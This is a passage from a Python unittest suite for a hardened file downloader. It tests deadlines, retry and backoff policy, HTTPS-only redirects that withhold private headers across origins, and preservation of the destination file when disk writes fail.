        def delayed_spawn(*_args: object, **_kwargs: object) -> BlockingResolverProcess:
            time.sleep(2.0)
            return process

        started = time.monotonic()
        with mock.patch.object(downloader.subprocess, "Popen", side_effect=delayed_spawn):
            with self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )
        elapsed = time.monotonic() - started

        self.assertLess(elapsed, 1.5)
        self.assertTrue(process.collected.wait(2))
        self.assertTrue(process.killed.is_set())
        self.assertNotIn(b"G", process.inputs)
        self.assertFalse(process.dns_started.is_set())
        residual = [
            thread for thread in threading.enumerate()
            if thread.name == "x86qw-download-open" and thread.is_alive()
        ]
        for thread in residual:
            thread.join(1)
        self.assertFalse(any(thread.is_alive() for thread in residual))

    def test_tiny_open_budget_is_rejected_before_transport_start(self) -> None:
        with mock.patch.object(downloader.subprocess, "Popen") as spawn:
            for budget in (0.01, downloader.MIN_OPEN_BUDGET_SECONDS):
                with self.subTest(budget=budget), self.assertRaises(
                    downloader.DownloadDeadlineError
                ):
                    self.download(
                        downloader.BoundedMetadata(
                            url=self.URL,
                            maximum_size=1024,
                            deadline_seconds=budget,
                            retry=downloader.RetryPolicy(attempts=1),
                        )
                    )

        spawn.assert_not_called()
        self.assertFalse(any(
            thread.name == "x86qw-download-open" and thread.is_alive()
            for thread in threading.enumerate()
        ))

    def test_keyboard_interrupt_cancels_and_collects_blocked_resolver(self) -> None:
        process = BlockingResolverProcess()
        real_join = downloader.threading.Thread.join
        interrupted = False

        def interrupt_first_controller_join(
            thread: threading.Thread, timeout: float | None = None,
        ) -> None:
            nonlocal interrupted
            if thread.name == "x86qw-download-open" and not interrupted:
                self.assertTrue(process.started.wait(1))
                interrupted = True
                raise KeyboardInterrupt
            real_join(thread, timeout)

        with mock.patch.object(
            downloader.subprocess, "Popen", return_value=process,
        ), mock.patch.object(
            downloader.threading.Thread, "join", interrupt_first_controller_join,
        ):
            with self.assertRaises(KeyboardInterrupt):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=2,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )

        self.assertTrue(process.killed.is_set())
        self.assertTrue(process.collected.is_set())
        self.assertFalse(any(
            thread.name == "x86qw-download-open" and thread.is_alive()
            for thread in threading.enumerate()
        ))

    def test_open_and_header_phase_cannot_outlive_total_deadline(self) -> None:
        registered = threading.Event()
        release = threading.Event()
        clock = AdvancingClock()
        opener = downloader._build_https_opener()
        registry = getattr(opener, "_x86qw_connection_registry")

        class CancelConnection:
            def close(self) -> None:
                release.set()

        def blocked_open(_request: object, *, timeout: float) -> FakeResponse:
            self.assertGreater(timeout, 0)
            registry.register(threading.get_ident(), CancelConnection())
            registered.set()
            release.wait(2)
            return FakeResponse(b"late")

        real_thread_start = downloader.threading.Thread.start
        real_thread_join = downloader.threading.Thread.join
        controller_joins: list[float | None] = []

        def start_then_expire_deadline(thread: threading.Thread) -> None:
            real_thread_start(thread)
            if thread.name == "x86qw-download-open":
                self.assertTrue(registered.wait(1))
                clock.advance(2)

        def record_controller_join(
            thread: threading.Thread, timeout: float | None = None,
        ) -> None:
            if thread.name == "x86qw-download-open":
                controller_joins.append(timeout)
                return
            real_thread_join(thread, timeout)

        with mock.patch.object(
            opener, "open", side_effect=blocked_open,
        ), mock.patch.object(
            downloader.threading.Thread, "start", start_then_expire_deadline,
        ), mock.patch.object(
            downloader.threading.Thread, "join", record_controller_join,
        ):
            with self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    ),
                    opener=opener,
                    clock=clock,
                )
        self.assertTrue(release.is_set())
        self.assertEqual([], controller_joins)
        for _ in range(50):
            if not any(
                thread.name == "x86qw-download-open" and thread.is_alive()
                for thread in threading.enumerate()
            ):
                break
            time.sleep(0.01)
        self.assertFalse(any(
            thread.name == "x86qw-download-open" and thread.is_alive()
            for thread in threading.enumerate()
        ))

    def test_worker_self_cancels_when_controller_wins_before_identity(self) -> None:
        clock = AdvancingClock()
        deferred: list[object] = []
        cancelled_identities: list[int] = []
        finished_identities: list[int] = []

        class DeferredThread:
            def __init__(self, *, target, name: str, daemon: bool) -> None:
                self.target = target
                self.name = name
                self.daemon = daemon
                self.ident = -1
                deferred.append(self)

            def start(self) -> None:
                clock.advance(2)

            def join(self, _timeout: float | None = None) -> None:
                raise AssertionError("o controller não deve aguardar após o deadline")

            def is_alive(self) -> bool:
                return True

        def cancel_open(identity: int) -> None:
            cancelled_identities.append(identity)

        def open_after_cancellation(
            _request: urllib.request.Request, _timeout: float,
        ) -> FakeResponse:
            self.assertIn(threading.get_ident(), cancelled_identities)
            raise downloader.DownloadDeadlineError("cancelado antes da conexão")

        with mock.patch.object(downloader.threading, "Thread", DeferredThread):
            with self.assertRaises(downloader.DownloadDeadlineError):
                downloader._open_with_deadline(
                    open_after_cancellation,
                    urllib.request.Request(self.URL),
                    1,
                    clock,
                    cancel_open,
                    finished_identities.append,
                )

        self.assertEqual([-1], cancelled_identities)
        deferred[0].target()
        worker_identity = threading.get_ident()
        self.assertEqual([-1, worker_identity], cancelled_identities)
        self.assertEqual([worker_identity], finished_identities)

    def test_transient_timeout_is_retried_but_http_404_is_not(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            opens = 0
            sleeps: list[float] = []

            def transient_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens == 1:
                    raise urllib.error.URLError(socket.timeout("timed out"))
                return FakeResponse(self.PAYLOAD)

            result = self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0.25,
                    maximum_backoff=1,
                ),
                testing_open_url=transient_then_success,
                clock=lambda: 0,
                sleep=sleeps.append,
            )
            self.assertEqual(2, opens)
            self.assertEqual(2, result.attempts)
            self.assertEqual([0.25], sleeps)
            self.assertEqual(self.PAYLOAD, destination.read_bytes())

            destination.write_bytes(b"preserve")
            not_found_opens = 0

            def not_found(_request: object, _timeout: float) -> FakeResponse:
                nonlocal not_found_opens
                not_found_opens += 1
                error = urllib.error.HTTPError(
                    self.URL, 404, "Not Found", {}, None,
                )
                error.close()
                raise error

            with self.assertRaises(downloader.DownloadTransportError):
                self.download(
                    self.pinned(destination, attempts=3),
                    testing_open_url=not_found,
                    clock=lambda: 0,
                    sleep=lambda _delay: self.fail("HTTP 404 não deve aguardar retry"),
                )
            self.assertEqual(1, not_found_opens)
            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, root)

    def test_chunked_style_reader_returns_to_monotonic_deadline_between_reads(self) -> None:
        clock = AdvancingClock()
        response = ReadOneResponse(b"metadata", clock)

        with self.assertRaises(downloader.DownloadDeadlineError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024,
                    deadline_seconds=1,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                testing_open_url=self.response_opener(response),
                clock=clock,
            )

        self.assertEqual(0, response.read_calls)
        self.assertEqual(2, response.read1_calls)

    def test_blocking_socket_read_times_out_before_late_peer_data(self) -> None:
        reader_socket, writer_socket = socket.socketpair()
        applied_timeouts: list[float] = []
        download_finished = threading.Event()
        peer_started = threading.Event()
        peer_sent = threading.Event()

        class RecordingSocket:
            def settimeout(self, value: float) -> None:
                applied_timeouts.append(value)
                reader_socket.settimeout(value)

            def recv(self, size: int) -> bytes:
                return reader_socket.recv(size)

        class BlockingSocketResponse(FakeResponse):
            def __init__(self) -> None:
                super().__init__()
                self._sock = RecordingSocket()

            def read1(self, size: int) -> bytes:
                return self._sock.recv(size)

        def delayed_peer() -> None:
            peer_started.set()
            if not download_finished.wait(3):
                try:
                    writer_socket.sendall(b"late")
                except OSError:
                    return
                peer_sent.set()

        peer = threading.Thread(
            target=delayed_peer,
            name="x86qw-test-late-peer",
        )
        peer.start()
        try:
            self.assertTrue(peer_started.wait(1))
            with self.assertRaises(downloader.DownloadTransientError):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=0.1,
                        retry=downloader.RetryPolicy(attempts=1),
                    ),
                    testing_open_url=self.response_opener(BlockingSocketResponse()),
                )
        finally:
            download_finished.set()
            reader_socket.close()
            writer_socket.close()
            peer.join(1)

        self.assertFalse(peer.is_alive())
        self.assertFalse(peer_sent.is_set())
        self.assertEqual(1, len(applied_timeouts))
        self.assertGreater(applied_timeouts[0], 0)
        self.assertLessEqual(applied_timeouts[0], 0.1 + 1e-9)

    def test_http_error_response_is_closed_before_returning(self) -> None:
        body = downloader.io.BytesIO(b"error")

        def not_found(_request: object, _timeout: float) -> FakeResponse:
            raise urllib.error.HTTPError(self.URL, 404, "Not Found", {}, body)

        with self.assertRaises(downloader.DownloadHTTPError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                testing_open_url=not_found,
            )
        self.assertTrue(body.closed)

    def test_http_error_close_failure_does_not_mask_the_typed_error(self) -> None:
        error = urllib.error.HTTPError(self.URL, 404, "Not Found", {}, None)
        original_close = error.close

        def fail_close() -> None:
            original_close()
            raise OSError(errno.EIO, "close failed")

        error.close = mock.Mock(side_effect=fail_close)

        def not_found(_request: object, _timeout: float) -> FakeResponse:
            raise error

        with self.assertRaises(downloader.DownloadHTTPError) as raised:
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                testing_open_url=not_found,
            )
        self.assertEqual(404, raised.exception.status)
        error.close.assert_called_once_with()

    def test_temporary_dns_failure_is_retried(self) -> None:
        opens = 0

        def dns_then_success(_request: object, _timeout: float) -> FakeResponse:
            nonlocal opens
            opens += 1
            if opens == 1:
                raise urllib.error.URLError(
                    socket.gaierror(socket.EAI_AGAIN, "temporary failure")
                )
            return FakeResponse(b"metadata")

        result = self.download(
            downloader.BoundedMetadata(
                url=self.URL,
                maximum_size=1024,
                deadline_seconds=10,
                retry=downloader.RetryPolicy(
                    attempts=2,
                    initial_backoff=0,
                    maximum_backoff=0,
                    jitter=0,
                ),
            ),
            testing_open_url=dns_then_success,
            clock=lambda: 0,
            sleep=lambda _delay: None,
        )
        self.assertEqual(2, opens)
        self.assertEqual(b"metadata", result.data)

    def test_retry_after_controls_transient_http_retry_delay(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            opens = 0
            sleeps: list[float] = []

            def busy_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens == 1:
                    error = urllib.error.HTTPError(
                        self.URL,
                        503,
                        "Service Unavailable",
                        {"retry-after": "3"},
                        None,
                    )
                    error.close()
                    raise error
                return FakeResponse(self.PAYLOAD)

            result = self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0.25,
                    maximum_backoff=10,
                ),
                testing_open_url=busy_then_success,
                clock=lambda: 0,
                sleep=sleeps.append,
            )

            self.assertEqual(2, result.attempts)
            self.assertEqual([3.0], sleeps)

    def test_retry_after_http_date_controls_transient_retry_delay(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            opens = 0
            sleeps: list[float] = []
            now = 1_000.0
            retry_at = email.utils.formatdate(now + 5, usegmt=True)

            def busy_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens == 1:
                    raise urllib.error.HTTPError(
                        self.URL,
                        503,
                        "Service Unavailable",
                        {"Retry-After": retry_at},
                        None,
                    )
                return FakeResponse(self.PAYLOAD)

            result = self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0.25,
                    maximum_backoff=10,
                ),
                testing_open_url=busy_then_success,
                clock=lambda: 0,
                wall_clock=lambda: now,
                sleep=sleeps.append,
            )

            self.assertEqual(2, result.attempts)
            self.assertEqual([5.0], sleeps)

    def test_invalid_retry_after_falls_back_to_exponential_backoff(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            opens = 0
            sleeps: list[float] = []

            def busy_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens == 1:
                    raise urllib.error.HTTPError(
                        self.URL,
                        503,
                        "Service Unavailable",
                        {"Retry-After": "not-a-date"},
                        None,
                    )
                return FakeResponse(self.PAYLOAD)

            result = self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0.5,
                    maximum_backoff=10,
                ),
                testing_open_url=busy_then_success,
                clock=lambda: 0,
                sleep=sleeps.append,
            )

            self.assertEqual(2, result.attempts)
            self.assertEqual([0.5], sleeps)

    def test_retry_after_larger_than_total_deadline_fails_without_sleeping(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            sleeps: list[float] = []

            def busy(_request: object, _timeout: float) -> FakeResponse:
                raise urllib.error.HTTPError(
                    self.URL,
                    503,
                    "Service Unavailable",
                    {"Retry-After": "3"},
                    None,
                )

            with self.assertRaises(downloader.DownloadRetryBudgetError):
                self.download(
                    self.pinned(
                        destination,
                        deadline_seconds=2,
                        attempts=2,
                        initial_backoff=0.5,
                        maximum_backoff=10,
                    ),
                    testing_open_url=busy,
                    clock=lambda: 0,
                    sleep=sleeps.append,
                )

            self.assertEqual([], sleeps)
            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_exponential_backoff_and_jitter_are_deterministic(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            opens = 0
            sleeps: list[float] = []
            random_values = iter((0.0, 0.5, 1.0))

            def transient_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens <= 3:
                    raise urllib.error.URLError(socket.timeout("timed out"))
                return FakeResponse(self.PAYLOAD)

            result = self.download(
                downloader.PinnedArtifact(
                    url=self.URL,
                    destination=destination,
                    expected_size=len(self.PAYLOAD),
                    expected_sha256=hashlib.sha256(self.PAYLOAD).hexdigest(),
                    maximum_size=len(self.PAYLOAD),
                    deadline_seconds=100,
                    retry=downloader.RetryPolicy(
                        attempts=4,
                        initial_backoff=1,
                        maximum_backoff=8,
                        jitter=0.25,
                    ),
                ),
                testing_open_url=transient_then_success,
                clock=lambda: 0,
                sleep=sleeps.append,
                random_value=lambda: next(random_values),
            )

            self.assertEqual(4, result.attempts)
            self.assertEqual(3, len(sleeps))
            for actual, expected in zip(sleeps, (0.75, 2.0, 5.0), strict=True):
                self.assertAlmostEqual(expected, actual)

    def test_http_status_retry_matrix_distinguishes_transient_and_permanent(self) -> None:
        for status in sorted(downloader.TRANSIENT_HTTP_STATUSES):
            with self.subTest(kind="transient", status=status):
                opens = 0

                def transient_then_success(
                    _request: object,
                    _timeout: float,
                    *,
                    response_status: int = status,
                ) -> FakeResponse:
                    nonlocal opens
                    opens += 1
                    if opens == 1:
                        raise urllib.error.HTTPError(
                            self.URL, response_status, "transient", {}, None,
                        )
                    return FakeResponse(b"metadata")

                result = self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=10,
                        retry=downloader.RetryPolicy(
                            attempts=2,
                            initial_backoff=0,
                            maximum_backoff=0,
                            jitter=0,
                        ),
                    ),
                    testing_open_url=transient_then_success,
                    clock=lambda: 0,
                    sleep=lambda _delay: None,
                )
                self.assertEqual(2, result.attempts)
                self.assertEqual(2, opens)

        for status in (400, 401, 403, 404, 409, 418, 501):
            with self.subTest(kind="permanent", status=status):
                opens = 0

                def permanent(
                    _request: object,
                    _timeout: float,
                    *,
                    response_status: int = status,
                ) -> FakeResponse:
                    nonlocal opens
                    opens += 1
                    raise urllib.error.HTTPError(
                        self.URL, response_status, "permanent", {}, None,
                    )

                with self.assertRaises(downloader.DownloadHTTPError) as raised:
                    self.download(
                        downloader.BoundedMetadata(
                            url=self.URL,
                            maximum_size=1024,
                            deadline_seconds=10,
                            retry=downloader.RetryPolicy(attempts=3),
                        ),
                        testing_open_url=permanent,
                        clock=lambda: 0,
                        sleep=lambda _delay: self.fail(
                            f"HTTP {status} permanente não deve aguardar retry"
                        ),
                    )
                self.assertEqual(status, raised.exception.status)
                self.assertEqual(1, opens)

    def test_retry_callback_reports_next_attempt_and_delay(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            opens = 0
            notices: list[tuple[int, str, float]] = []

            def transient_then_success(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                if opens == 1:
                    raise urllib.error.URLError(socket.timeout("timed out"))
                return FakeResponse(self.PAYLOAD)

            self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0.25,
                    maximum_backoff=1,
                ),
                testing_open_url=transient_then_success,
                clock=lambda: 0,
                sleep=lambda _delay: None,
                on_retry=lambda attempt, error, delay: notices.append(
                    (attempt, str(error), delay)
                ),
            )

            self.assertEqual([(2, "Falha temporária de rede: timed out", 0.25)], notices)

    def test_http_redirect_is_rejected_before_destination_changes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(
                self.PAYLOAD,
                url="http://downloads.example.invalid/artifact.zip",
            )

            with self.assertRaises(downloader.DownloadRedirectError):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_https_redirects_close_intermediate_response_without_reading_body(self) -> None:
        redirect_statuses = (301, 302, 303, 307, 308)

        class IntermediateResponse:
            def __init__(self) -> None:
                self.close_calls = 0

            def read(self, *_args: object, **_kwargs: object) -> bytes:
                raise AssertionError("o corpo intermediário não pode ser lido")

            def close(self) -> None:
                self.close_calls += 1

        class ParentOpener:
            def __init__(self) -> None:
                self.calls: list[tuple[urllib.request.Request, float]] = []

            def open(self, request: urllib.request.Request, *, timeout: float) -> object:
                self.calls.append((request, timeout))
                return request

        for index, status in enumerate(redirect_statuses):
            with self.subTest(status=status):
                handler = downloader.HTTPSOnlyRedirectHandler()
                parent = ParentOpener()
                handler.parent = parent
                request = downloader.urllib.request.Request(self.URL)
                request.timeout = 7.5
                response = IntermediateResponse()
                headers = Message()
                header_name = "Location" if index % 2 == 0 else "URI"
                headers[header_name] = f"/redirected/{status}"

                result = getattr(handler, f"http_error_{status}")(
                    request, response, status, "Redirect", headers,
                )

                self.assertEqual(1, response.close_calls)
                self.assertEqual(1, len(parent.calls))
                redirected, timeout = parent.calls[0]
                self.assertIs(result, redirected)
                self.assertEqual(
                    f"https://downloads.example.invalid/redirected/{status}",
                    redirected.full_url,
                )
                self.assertEqual(7.5, timeout)

    def test_redirect_loop_and_http_downgrade_close_without_reading_body(self) -> None:
        class IntermediateResponse:
            def __init__(self) -> None:
                self.close_calls = 0

            def read(self, *_args: object, **_kwargs: object) -> bytes:
                raise AssertionError("o corpo intermediário não pode ser lido")

            def close(self) -> None:
                self.close_calls += 1

        handler = downloader.HTTPSOnlyRedirectHandler()
        parent = mock.Mock()
        handler.parent = parent

        for target, expected_error in (
            (
                "https://downloads.example.invalid/loop",
                downloader.DownloadRedirectError,
            ),
            ("http://downloads.example.invalid/downgrade", downloader.DownloadPolicyError),
        ):
            with self.subTest(target=target):
                request = downloader.urllib.request.Request(self.URL)
                request.timeout = 7.5
                if target.startswith("https:"):
                    request.redirect_dict = {target: handler.max_repeats}
                response = IntermediateResponse()
                headers = Message()
                headers["Location"] = target

                with self.assertRaises(expected_error):
                    handler.http_error_302(
                        request, response, 302, "Redirect", headers,
                    )

                self.assertEqual(1, response.close_calls)
        parent.open.assert_not_called()

    def test_redirect_handler_rejects_http_before_following_it(self) -> None:
        handler = downloader.HTTPSOnlyRedirectHandler()
        request = downloader.urllib.request.Request(self.URL)
        with mock.patch.object(
            downloader.urllib.request.HTTPRedirectHandler,
            "redirect_request",
            side_effect=AssertionError("redirect HTTP não pode ser seguido"),
        ) as parent_redirect:
            with self.assertRaises(downloader.DownloadPolicyError):
                handler.redirect_request(
                    request,
                    None,
                    302,
                    "Found",
                    {},
                    "http://downloads.example.invalid/artifact.zip",
                )
        parent_redirect.assert_not_called()

    def test_redirect_handler_preserves_head_on_python_310(self) -> None:
        handler = downloader.HTTPSOnlyRedirectHandler()
        request = downloader.urllib.request.Request(self.URL, method="HEAD")
        redirected = downloader.urllib.request.Request(
            "https://downloads.example.invalid/final", method="GET"
        )
        with mock.patch.object(
            downloader.urllib.request.HTTPRedirectHandler,
            "redirect_request",
            return_value=redirected,
        ):
            result = handler.redirect_request(
                request,
                None,
                302,
                "Found",
                {},
                "https://downloads.example.invalid/final",
            )
        self.assertIsNotNone(result)
        self.assertEqual("HEAD", result.get_method())

    def test_cross_origin_redirect_rejects_private_headers(self) -> None:
        handler = downloader.HTTPSOnlyRedirectHandler()
        request = downloader.urllib.request.Request(
            self.URL,
            headers={"Authorization": "Bearer secret", "User-Agent": "x86qw-test"},
        )
        with mock.patch.object(
            downloader.urllib.request.HTTPRedirectHandler,
            "redirect_request",
            side_effect=AssertionError("headers privados não podem sair da origem"),
        ) as parent_redirect:
            with self.assertRaises(downloader.DownloadRedirectError):
                handler.redirect_request(
                    request,
                    None,
                    302,
                    "Found",
                    {},
                    "https://other.example.invalid/artifact.zip",
                )
        parent_redirect.assert_not_called()

    def test_cross_origin_redirect_allows_only_public_transport_headers(self) -> None:
        handler = downloader.HTTPSOnlyRedirectHandler()
        request = downloader.urllib.request.Request(
            self.URL,
            headers={"Accept": "application/octet-stream", "User-Agent": "x86qw-test"},
        )
        redirected = downloader.urllib.request.Request(
            "https://other.example.invalid/artifact.zip"
        )
        with mock.patch.object(
            downloader.urllib.request.HTTPRedirectHandler,
            "redirect_request",
            return_value=redirected,
        ) as parent_redirect:
            result = handler.redirect_request(
                request,
                None,
                302,
                "Found",
                {},
                redirected.full_url,
            )
        self.assertIs(result, redirected)
        parent_redirect.assert_called_once()

    def test_contract_rejects_non_finite_or_unsafe_policy_values(self) -> None:
        invalid_policies = (
            lambda: downloader.RetryPolicy(attempts=True),
            lambda: downloader.RetryPolicy(initial_backoff=float("nan")),
            lambda: downloader.RetryPolicy(maximum_backoff=float("inf")),
            lambda: downloader.RetryPolicy(jitter=float("nan")),
            lambda: downloader.RetryPolicy(transient_statuses=frozenset({404})),
        )
        for build in invalid_policies:
            with self.subTest(build=build), self.assertRaises(downloader.DownloadPolicyError):
                build()

        for maximum, deadline in ((True, 1), (1024, float("nan"))):
            with self.subTest(maximum=maximum, deadline=deadline), self.assertRaises(
                downloader.DownloadPolicyError
            ):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=maximum,
                        deadline_seconds=deadline,
                    ),
                    testing_open_url=self.response_opener(FakeResponse()),
                )

    def _assert_output_failure_preserves_destination(
        self,
        *,
        write_error: OSError | None = None,
        flush_error: OSError | None = None,
        short_write: bool = False,
        close_error: OSError | None = None,
        fsync_error: OSError | None = None,
        replace_error: OSError | None = None,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            destination.write_bytes(b"preserve")
            descriptor, temporary_path = downloader.private_fs.private_mkstemp(
                directory=root, prefix=".controlled-", suffix=".download",
            )
            handle = os.fdopen(descriptor, "wb")
            output = OutputProxy(
                handle,
                write_error=write_error,
                flush_error=flush_error,
                short_write=short_write,
                close_error=close_error,
            )

            with ExitStack() as stack:
                stack.enter_context(mock.patch.object(
                    downloader,
                    "_open_temporary",
                    return_value=(output, temporary_path),
                ))
                if fsync_error is not None:
                    stack.enter_context(mock.patch.object(
                        downloader.os, "fsync", side_effect=fsync_error,
                    ))
                if replace_error is not None:
                    if os.name == "nt":
                        stack.enter_context(mock.patch.object(
                            downloader.private_fs,
                            "replace_open_private_file",
                            side_effect=replace_error,
                        ))
                    else:
                        stack.enter_context(mock.patch.object(
                            downloader.os, "replace", side_effect=replace_error,
                        ))
                with self.assertRaises(downloader.DownloadStorageError):
                    self.download(
                        self.pinned(destination),
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

            expected = (
                self.PAYLOAD
                if os.name == "nt" and close_error is not None
                else b"preserve"
            )
            self.assertEqual(expected, destination.read_bytes())
            self.assertFalse(temporary_path.exists())

    def test_successful_promotion_orders_durability_before_atomic_replace(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            destination.write_bytes(b"preserve")
            descriptor, temporary_path = downloader.private_fs.private_mkstemp(
                directory=root, prefix=".controlled-", suffix=".download",
            )
            handle = os.fdopen(descriptor, "wb")
            events: list[str] = []

            class OrderedOutput(OutputProxy):
                def flush(self) -> None:
                    events.append("flush")
                    super().flush()

                def close(self) -> None:
                    events.append("close")
                    super().close()

            output = OrderedOutput(handle)
            original_replace = os.replace

            def fsync(_descriptor: int) -> None:
                events.append("fsync")

            def replace(source: str | os.PathLike[str], target: str | os.PathLike[str]) -> None:
                events.append("replace")
                original_replace(source, target)

            original_private_replace = downloader.private_fs.replace_open_private_file

            def private_replace(descriptor: int, source: Path, target: Path) -> None:
                events.append("replace")
                original_private_replace(descriptor, source, target)

            with mock.patch.object(
                downloader,
                "_open_temporary",
                return_value=(output, temporary_path),
            ), mock.patch.object(
                downloader.os,
                "fsync",
                side_effect=fsync,
            ):
                replacement = (
                    mock.patch.object(
                        downloader.private_fs,
                        "replace_open_private_file",
                        side_effect=private_replace,
                    )
                    if os.name == "nt"
                    else mock.patch.object(
                        downloader.os, "replace", side_effect=replace,
                    )
                )
                with replacement:
                    self.download(
                        self.pinned(destination),
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

            self.assertEqual(
                ["flush", "fsync", "replace", "close"]
                if os.name == "nt"
                else ["flush", "fsync", "close", "replace"],
                events,
            )
            self.assertEqual(self.PAYLOAD, destination.read_bytes())
            self.assertFalse(temporary_path.exists())

    def test_mkstemp_permission_and_disk_full_failures_preserve_destination(self) -> None:
        for error_number, message in (
            (errno.EACCES, "permission denied"),
            (errno.ENOSPC, "no space left"),
        ):
            with self.subTest(errno=error_number), tempfile.TemporaryDirectory() as temporary:
                destination = Path(temporary) / "artifact.zip"
                destination.write_bytes(b"preserve")

                with mock.patch.object(
                    downloader.private_fs,
                    "private_mkstemp",
                    side_effect=OSError(error_number, message),
                ), self.assertRaises(downloader.DownloadStorageError):
                    self.download(
                        self.pinned(destination),
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

                self.assertEqual(b"preserve", destination.read_bytes())
                self.assert_no_download_temporaries(self, destination.parent)

    def test_enospc_while_writing_preserves_destination(self) -> None:
        self._assert_output_failure_preserves_destination(
            write_error=OSError(errno.ENOSPC, "no space left"),
        )

    def test_short_write_preserves_destination(self) -> None:
        self._assert_output_failure_preserves_destination(short_write=True)

    def test_close_failure_is_typed_without_removing_a_promoted_identity(self) -> None:
        self._assert_output_failure_preserves_destination(
            close_error=OSError(errno.EIO, "close failed"),
        )

    def test_flush_failure_preserves_destination(self) -> None:
        self._assert_output_failure_preserves_destination(
            flush_error=OSError(errno.EIO, "flush failed"),
        )

    def test_fsync_failure_preserves_destination(self) -> None:
        self._assert_output_failure_preserves_destination(
            fsync_error=OSError(errno.EIO, "fsync failed"),
        )

    def test_replace_failure_preserves_destination(self) -> None:
        self._assert_output_failure_preserves_destination(
            replace_error=OSError(errno.EIO, "replace failed"),
        )


if __name__ == "__main__":
    unittest.main()
